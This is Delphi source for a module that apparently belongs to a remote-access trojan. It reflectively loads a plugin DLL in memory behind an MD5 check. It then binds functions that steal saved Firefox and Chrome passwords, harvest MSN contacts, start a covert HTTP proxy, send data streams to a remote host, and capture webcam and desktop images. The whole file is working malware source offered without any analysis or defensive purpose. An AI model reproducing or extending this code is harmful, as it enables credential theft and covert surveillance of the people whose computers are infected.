Unit UnitCarregarFuncoes;

interface

uses
  windows,
  SocketUnit,
  UnitDiversos,
  BTMemoryModule,
  UnitCryptString,
  UnitSettings,
  MD5,
  UnitComandos,
  ListarDispositivos;

type
  xMozilla3_5Password = function: string;

  xGetContactList = function: string;
  xSetMSNStatus = procedure(Status: integer);
  xGetMSNStatus = function: integer;
  xGetCurrentMSNSettings = function: string;

  xGetChromePass = function(sqlite3Dll: string): string;
  xStartHttpProxy = function(port: integer): boolean;

  xEnviarStream = procedure(Host: string; Port: integer; MasterPassword, TextString: string);

var
  mp_MemoryModule: PBTMemoryModule = nil;
  mp_MemoryModulePortas: PBTMemoryModule;
  mp_MemoryModuleDesktopImg: PBTMemoryModule;
  mp_MemoryModuleWebcam: PBTMemoryModule;


  Mozilla3_5Password: xMozilla3_5Password;

  GetContactList: xGetContactList;
  SetMSNStatus: xSetMSNStatus;
  GetMSNStatus: xGetMSNStatus;
  GetCurrentMSNSettings: xGetCurrentMSNSettings;

  GetChromePass: xGetChromePass;
  StartHttpProxy: xStartHttpProxy;

  EnviarStream: xEnviarStream;

  DllBufferPortas: string;
  DllBufferDesktopImg: string;
  DllBufferWebcam: string;

  function CarregarDll(dllbuffer: string): boolean;
  procedure LiberarDll;
  procedure DeletarDlls;
  procedure CarregarDllActivePort;

implementation

uses
  UnitListarPortasAtivas;

function CarregarDll(dllbuffer: string): boolean;
var
  mp_DllData: Pointer;
  mp_DllDataDesktopImg: pointer;
  mp_DllDataWebcam: pointer;

  TempDll: string;
  m_DllDataSize: cardinal;
begin
  mp_MemoryModule := nil;
  
  result := false;
  TempDll := dllbuffer;

  if MD5plugin = MD5Print(MD5String(TempDll)) then result := true else exitprocess(0);

  DllBufferPortas := TempDll;  // usado na função de listar portas ativas
  DllBufferDesktopImg := TempDll;  // usado na função de desktop imagem
  DllBufferWebcam := TempDll;  // usado na função de webcam

  mp_DllData := @TempDll[1];
  mp_DllDataDesktopImg := @DllBufferDesktopImg[1];
  mp_DllDataWebcam := @DllBufferWebcam[1];

  mp_MemoryModule := BTMemoryLoadLibary(mp_DllData, m_DllDataSize);
  mp_MemoryModuleDesktopImg := BTMemoryLoadLibary(mp_DllDataDesktopImg, m_DllDataSize);
  mp_MemoryModuleWebcam := BTMemoryLoadLibary(mp_DllDataWebcam, m_DllDataSize);

  try
    if mp_MemoryModule = nil then exit;

    @Mozilla3_5Password := BTMemoryGetProcAddress(mp_MemoryModule, 'Mozilla3_5Password');

    @GetContactList := BTMemoryGetProcAddress(mp_MemoryModule, 'GetContactList');
    @SetMSNStatus := BTMemoryGetProcAddress(mp_MemoryModule, 'SetMSNStatus');
    @GetMSNStatus := BTMemoryGetProcAddress(mp_MemoryModule, 'GetMSNStatus');
    @GetCurrentMSNSettings := BTMemoryGetProcAddress(mp_MemoryModule, 'GetCurrentMSNSettings');

    @GetChromePass := BTMemoryGetProcAddress(mp_MemoryModule, 'GetChromePass');
    @StartHttpProxy := BTMemoryGetProcAddress(mp_MemoryModule, 'StartHttpProxy');

    @EnviarStream := BTMemoryGetProcAddress(mp_MemoryModule, 'EnviarStream');

    except
    exit;
  end;
  result := true;
  StartDevicesVar;
end;

procedure LiberarDll;
begin
  try
    if mp_MemoryModule <> nil then
    begin
      StopDevicesVar;
      BTMemoryFreeLibrary(mp_MemoryModule);
      BTMemoryFreeLibrary(mp_MemoryModuleDesktopImg);
      BTMemoryFreeLibrary(mp_MemoryModuleWebcam);
    end;
    mp_MemoryModule := nil;
    mp_MemoryModuleDesktopImg := nil;
    mp_MemoryModuleWebcam := nil;
    except
  end;
end;

procedure DeletarDlls;
begin
  LiberarDll;
end;

procedure CarregarDllActivePort;
begin
  ReadTCPTable;
  ReadUdpTable;
end;

end.
